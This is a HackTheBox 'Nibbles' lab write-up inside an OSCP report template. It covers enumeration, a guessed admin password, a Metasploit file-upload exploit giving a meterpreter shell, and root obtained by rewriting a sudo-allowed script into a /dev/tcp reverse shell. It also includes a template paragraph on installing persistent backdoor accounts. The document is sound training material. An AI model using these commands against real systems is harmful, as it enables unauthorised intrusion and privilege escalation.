---
title: "HackTheBox: Nibbles"
author: ["jurgen.kobierczynski@telenet.be", "OSID: XXXX"]
date: "2021-01-04"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "Nibbles"
lang: "en"
titlepage: true
titlepage-color: "DC143C"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Report: Nibbles 

## Introduction

The Offensive Security Exam penetration test report contains all efforts that were conducted in order to pass the Offensive Security course.
This report should contain all items that were used to pass the overall exam.
This report will be graded from a standpoint of correctness and fullness to all aspects of the  exam.
The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the Offensive Security Certified Professional.

## Objective

The objective of this assessment is to perform an internal penetration test against the Offensive Security Exam network.
The student is tasked with following methodical approach in obtaining access to the objective goals.
This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report.
An example page has already been created for you at the latter portions of this document that should give you ample information on what is expected to pass this course.
Use the sample report as a guideline to get you through the reporting.

## Requirements

The student will be required to fill out this penetration testing report and include the following sections:

- Overall High-Level Summary and Recommendations (non-technical)
- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.
- Any additional items that were not included

# Sample Report: High-Level Summary

John Doe was tasked with performing an internal penetration test towards Offensive Security Labs.
An internal penetration test is a dedicated attack against internally connected systems.
The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security's internal lab systems: the **THINC.local** domain.
John's overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security's network.
When performing the attacks, John was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.
During the testing, John had administrative level access to multiple systems.
All systems were successfully exploited and access granted.
These systems as well as a brief description on how access was obtained are listed below:

- Exam Trophy 1: Got in through X
- Exam Trophy 2: Got in through X

## Sample Report: Recommendations

John recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future.
One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Sample Report: Methodologies

John utilized a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Labs and Exam environments are secure.
Below is a breakout of how John was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

## Sample Report: Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test.
During this penetration test, John was tasked with exploiting the exam network.
The specific IP addresses were:

**Exam Network**

Host: 10.10.10.75 

## Sample Report: Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.

# Nmap scan host

```
user@kali:~/hackthebox/hackthebox/nibbles$ sudo nmap -sC -sV -Pn -p- -oA nmap/nibbles-fulltcp 10.10.10.75
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 02:59 CET
Nmap scan report for 10.10.10.75
Host is up (0.026s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.63 seconds
```

We see the main website is very basic ahd has in its source a reference to nibbleblog:

*[Image: ImgPlaceholder]*

This is the Nibbleblog webpage:

*[Image: ImgPlaceholder]*

Searchsploit shows us there are a few exploits for Nibbleblog:

```
user@kali:~$ searchsploit nibble
------------------------------------------------------ ---------------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) | php/remote/38489.rb
------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Gobuster shows us the following directory entries for nibbleblog:

```
/admin (Status: 301)
/admin.php (Status: 200)
/plugins (Status: 301)
/themes (Status: 301)
/feed.php (Status: 200)
/install.php (Status: 200)
/content (Status: 301)
/languages (Status: 301)
/sitemap.php (Status: 200)
/index.php (Status: 200)
/update.php (Status: 200)
/README (Status: 200)
/COPYRIGHT.txt (Status: 200)
/LICENSE.txt (Status: 200)
```

On the url http://10.10.10.75/nibbleblog/README we find the release of Nibbleblog is v4.0.3
```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
...
```

We can find the exploit for Nibbleblog v4.0.3 in Metasploit, but we need a username/password:

```
msf6 > search nibble

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability

Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/nibbleblog_file_upload) > options

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   USERNAME                    yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.205    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3

msf6 exploit(multi/http/nibbleblog_file_upload) > set rhosts 10.10.10.75
rhosts => 10.10.10.75
msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi /nibbleblog/
targeturi => /nibbleblog/
msf6 exploit(multi/http/nibbleblog_file_upload) > set lhost tun0
lhost => tun0
msf6 exploit(multi/http/nibbleblog_file_upload) > 
```

There is a login page for Nibbleblog on http://10.10.10.75/nibbleblog/admin.php:

*[Image: ImgPlaceholder]*

We can, however, easily guess the password 'nibbles':

*[Image: ImgPlaceholder]*

With this info we can set the correct parameters in Metasploit and launch the attack:

```
msf6 exploit(multi/http/nibbleblog_file_upload) > options

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.75      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /nibbleblog/     yes       The base path to the web application
   USERNAME                    yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3

msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
password => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin
username => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > run

[*] Started reverse TCP handler on 10.10.14.28:4444 
[*] Sending stage (39282 bytes) to 10.10.10.75
[*] Meterpreter session 1 opened (10.10.14.28:4444 -> 10.10.10.75:39388) at 2021-01-09 03:44:07 +0100
[+] Deleted image.php

meterpreter > getuid
Server username: nibbler (1001)
```

We upload linpeas.sh:

```
meterpreter > shell
Process 1634 created.
Channel 0 created.
ls
db.xml
pwd
/var/www/html/nibbleblog/content/private/plugins/my_image
exit
meterpreter > lcd upload
meterpreter > lpwd
/home/user/hackthebox/hackthebox/nibbles/upload
meterpreter > cd /dev/shm
meterpreter > pwd
/dev/shm
meterpreter > upload linpeas.sh
[*] uploading  : /home/user/hackthebox/hackthebox/nibbles/upload/linpeas.sh -> linpeas.sh
[*] Uploaded -1.00 B of 156.72 KiB (-0.0%): /home/user/hackthebox/hackthebox/nibbles/upload/linpeas.sh -> linpeas.sh
[*] uploaded   : /home/user/hackthebox/hackthebox/nibbles/upload/linpeas.sh -> linpeas.sh
```

Then we give linpeas.sh execute rights and run it:

```
meterpreter > shell
Process 1637 created.
Channel 2 created.
ls
linpeas.sh
chmod +x linpeas.sh
linpeas v2.3.8 by carlospolop
```

We find credentials in the MySQL database using default 'root'/'toor' credentials:

```
===================================( Software Information )===================================                                                                                               
[+] MySQL version                                                                                                                                                                            
mysql  Ver 14.14 Distrib 5.7.20, for Linux (x86_64) using  EditLine wrapper

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... Yes
User    Host    authentication_string
root    localhost       *9CFBBC772F3F6C106020035386DA5BBBF1249A11
mysql.session   localhost       *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
mysql.sys       localhost       *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
debian-sys-maint        localhost       *0B46F5EC336AFB411DB534D6A50EA98C619B0DE4
[+] MySQL connection using root/NOPASS ................. No
[+] Looking for mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/
```

Also we find sudo execution rights for the nibbler account:

```
[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

We find the user flag:

*[Image: ImgPlaceholder]*

The file /home/nibbler/personal/stuff/monitor.sh is not at the location, however we find a personal.zip file we unzip:

```
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
```

We execute this command to change the monitor script:

```
echo '#!/bin/bash' > monitor.sh
echo 'bash -i >& /dev/tcp/10.10.14.28/5555 0>&1' >> monitor.sh
cat monitor.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.28/5555 0>&1
ls -l 
total 4
-rwxrwxrwx 1 nibbler nibbler 54 Jan  8 22:45 monitor.sh
```

In another term we open a nc listening on port 5555:

```
ser@kali:~/hackthebox/hackthebox/nibbles$ nc -lnvp 5555
Listening on 0.0.0.0 5555
```

Then we use the sudo command to launch the reverse shell:

```
sudo -u root /home/nibbler/personal/stuff/monitor.sh
```

We find the root flag under /root:

*[Image: ImgPlaceholder]*

## Sample Report: Penetration

**Vulnerability Fix:**

**Severity:** Critical

**Proof of Concept Code Here:**

\newpage

## Sample Report: Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

John added administrator and root level accounts on all systems compromised.
In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.

## Sample Report: House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After the trophies on the exam network were completed, John removed all user accounts and passwords as well as the meterpreter services installed on the system.
Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items Not Mentioned in the Report

This section is placed for any additional items that were not mentioned in the overall report.
